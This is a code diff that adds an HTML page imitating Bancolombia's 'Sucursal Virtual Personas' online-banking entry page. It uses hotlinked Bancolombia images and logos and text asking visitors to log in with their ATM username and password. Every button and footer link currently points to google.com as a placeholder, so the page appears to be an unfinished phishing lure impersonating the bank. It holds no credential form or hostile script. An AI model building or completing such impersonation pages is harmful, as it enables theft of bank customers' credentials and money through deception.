@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sucursal Virtual Personas</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    font-family:Arial, Helvetica, sans-serif;
+    background:#ffffff;
+    color:#1e1e1e;
+}
+
+a{
+    text-decoration:none;
+}
+
+/* HEADER */
+header{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:28px 22px;
+}
+
+.logo{
+    width:170px;
+}
+
+.right-menu{
+    display:flex;
+    align-items:center;
+    gap:18px;
+}
+
+.menu-text{
+    font-size:30px;
+    font-weight:400;
+}
+
+.dots{
+    font-size:42px;
+    line-height:0;
+}
+
+/* BANNER */
+.banner{
+    padding:0 18px;
+}
+
+.banner img{
+    width:100%;
+    display:block;
+}
+
+/* CONTENT */
+.content{
+    padding:52px 18px 25px;
+}
+
+h1{
+    font-size:24px;
+    font-weight:700;
+    line-height:0.08;
+    margin-bottom:62px;
+}
+
+p{
+    font-size:14px;
+    line-height:1.45;
+    color:#2c2c2c;
+}
+
+/* BOTON PRINCIPAL */
+.btn-wrap{
+    padding:0 18px;
+    margin-top:20px;
+    margin-bottom:30px;
+}
+
+.btn{
+    width:100%;
+    display:block;
+    text-align:center;
+    border:none;
+    background:#fddb00;
+    border-radius:60px;
+    padding:20px 44px;
+    font-size:17px;
+    font-weight:700;
+    color:#000000;   /* COLOR LETRA BOTON */
+}
+
+/* TABS */
+.tabs{
+    background:#fff;
+    border-top:1px solid #ddd;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:18px 18px 0;
+}
+
+.tab{
+    font-size:16px;
+    color:#222;
+    padding-bottom:16px;
+}
+
+.tab a{
+    color:#222;
+}
+
+.active{
+    font-weight:700;
+    border-bottom:4px solid #1f1f1f;
+}
+
+/* SECTION */
+.section{
+    background:#f7efbc;
+    padding:23px 20px;
+    text-align:center;
+}
+
+.section h2{
+    font-size:19px;
+    font-weight:700;
+}
+
+/* NEGOCIOS */
+.negocios{
+    background:#2b2b2b;
+    padding:28px 18px 38px;
+    color:#fff;
+}
+
+.video-box{
+    border:2px solid #8c8c8c;
+    border-radius:18px;
+    overflow:hidden;
+    margin-bottom:28px;
+}
+
+.video-box iframe{
+    width:100%;
+    height:220px;
+    border:none;
+}
+
+.negocios h3{
+    font-size:24px;
+    font-weight:700;
+    line-height:1.08;
+    margin-bottom:26px;
+}
+
+.negocios p{
+    color:#fff;
+    font-size:14px;
+    line-height:1.45;
+    margin-bottom:28px;
+}
+
+.btn-yellow{
+    width:100%;
+    display:block;
+    text-align:center;
+    background:#fddb00;
+    color:#000;
+    border-radius:60px;
+    padding:18px;
+    font-size:17px;
+    font-weight:700;
+    margin-bottom:18px;
+}
+
+.btn-dark{
+    width:100%;
+    display:block;
+    text-align:center;
+    background:transparent;
+    color:#fff;
+    border:2px solid #d7d7d7;
+    border-radius:60px;
+    padding:18px;
+    font-size:17px;
+    font-weight:700;
+}
+
+/* FOOTER */
+footer{
+    background:#1f1f1f;
+    color:#fff;
+    padding:45px 22px 70px;
+}
+
+.footer-logo{
+    width:180px;
+    filter:brightness(0) invert(1);
+    margin-bottom:28px;
+}
+
+footer h4{
+    font-size:22px;
+    margin-bottom:20px;
+}
+
+footer p{
+    color:#d7d7d7;
+    font-size:14px;
+    line-height:1.7;
+    margin-bottom:16px;
+}
+
+.footer-links{
+    display:flex;
+    flex-direction:column;
+    gap:14px;
+    margin:24px 0;
+}
+
+.footer-links a{
+    color:#fff;
+    font-size:15px;
+}
+
+.copy{
+    border-top:1px solid #444;
+    padding-top:24px;
+    margin-top:20px;
+    color:#bcbcbc;
+    font-size:13px;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+<img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxlf8H1ChT1jBDgvGVTP4O8DEUFnEt_XK5SQ&s">
+
+<div class="right-menu">
+<div class="menu-text"></div>
+<div class="dots">⋮</div>
+</div>
+</header>
+
+<div class="banner">
+<img src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/6edaecd1-8636-4f08-829c-cf694c945552/svp-banner-desk.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-6edaecd1-8636-4f08-829c-cf694c945552-psdjgwo">
+</div>
+
+<div class="content">
+<h1>Sucursal Virtual Personas</h1>
+
+<p>
+Entra con tu mismo usuario y clave del cajero.<br>
+Disfruta una nueva imagen: más fácil, más simple.<br>
+La renovamos para ti.
+</p>
+</div>
+
+<div class="btn-wrap">
+<a href="https://google.com" class="btn">Ir a la Sucursal Virtual</a>
+</div>
+
+<div class="tabs">
+<div class="tab active"><a href="https://google.com">🖥️ Descubre lo nuevo de Pymes</a></div>
+<div class="tab"><a href="https://google.com">☝ ¿Qué puedo hacer en Pymes?</a></div>
+</div>
+
+<div class="section">
+<h2>Entérate de lo nuevo: Negocios Pymes</h2>
+</div>
+
+<div class="negocios">
+
+<div class="video-box">
+<iframe src="https://www.youtube.com/embed/Kd-SW-kNHQE?enablejsapi=1" allowfullscreen></iframe>
+</div>
+
+<h3>App y Sucursal Virtual Negocios</h3>
+
+<p>
+Evoluciona tu negocio con todas las soluciones que te ofrecemos en un solo lugar.
+</p>
+
+<br><br><br>
+<a href="https://google.com" class="btn-dark">Sucursal Virtual Negocios</a>
+
+</div>
+
+<footer>
+
+<img class="footer-logo" src="https://static.wikia.nocookie.net/logopedia/images/7/7e/Bancolombia_2021_Blanco.svg/revision/latest/scale-to-width-down/1200?cb=20220429043613&path-prefix=es">
+
+<h4>Estamos para acompañarte</h4>
+
+<p>
+Conoce nuestros canales digitales y servicios.
+</p>
+
+<div class="footer-links">
+<a href="https://google.com">Personas</a>
+<a href="https://google.com">Negocios</a>
+<a href="https://google.com">Empresas</a>
+<a href="https://google.com">Ayuda</a>
+</div>
+
+<div class="copy">
+© 2026 Bancolombia S.A.
+</div>
+
+</footer>
+
+</body>
+</html>
